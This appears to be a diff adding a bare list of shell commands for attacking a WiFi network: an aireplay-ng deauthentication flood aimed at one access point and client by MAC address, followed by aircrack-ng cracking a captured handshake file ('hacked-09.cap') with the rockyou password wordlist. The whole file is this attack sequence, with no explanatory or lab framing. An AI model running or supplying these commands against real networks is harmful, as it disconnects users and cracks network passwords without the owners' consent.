@@ -1,0 +1,22 @@
+aireplay-ng --deauth 100 -a CC:2D:21:1D:A8:20 -c 2A:BE:C8:B7:81:C4 
+wlan0
+
+ls
+
+aircrack-ng hacked-09.cap
+
+aircrack-ng hacked-09.cap -w /usr/share/wordlists/rockyou.txt
+
+ls /usr/share/wordlists
+
+cd /usr/share/wordlists
+
+ls -l /usr/share/wordlists
+
+sudo gzip -d rockyou.txt.gz
+
+ls -l /usr/share/wordlists
+
+ls
+
+aircrack-ng hacked-09.cap
